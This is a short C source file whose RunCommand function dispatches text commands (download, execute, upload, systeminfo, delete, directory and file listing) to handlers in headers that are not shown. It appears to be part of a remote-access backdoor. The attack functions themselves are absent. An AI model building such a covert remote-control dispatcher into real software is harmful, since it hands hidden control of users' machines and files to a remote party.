#include "GetParameter.h"
#include "Download.h"
#include "Execute.h"
#include "Upload.h"
#include "SystemInfo.h"
#include "Delete.h"
#include "DirList.h"
#include "Filelist.h"

bool RunCommand(char Command[200]);

bool RunCommand(char Command[200])
{
	char	TempCommand[9];

	lstrcpyn(TempCommand, Command, 8);

	if(lstrcmp(TempCommand, "downloa") == 0)
		if(Download(Command) == true) return true;

	if(lstrcmp(TempCommand, "execute") == 0)
		if(Execute(Command) == true) return true;

	if(lstrcmp(TempCommand, "upload ") == 0)
		if(Upload(Command) == true) return true;

	if(lstrcmp(TempCommand, "systemi") == 0)
		if(SystemInfo(Command) == true) return true;

	if(lstrcmp(TempCommand, "delete ") == 0)
		if(Delete(Command) == true) return true;

	if(lstrcmp(TempCommand, "dirlist") == 0)
		if(Dirlist(Command) == true) return true;

	if(lstrcmp(TempCommand, "filelis") == 0)
		if(Filelist(Command) == true) return true;

	return false;
}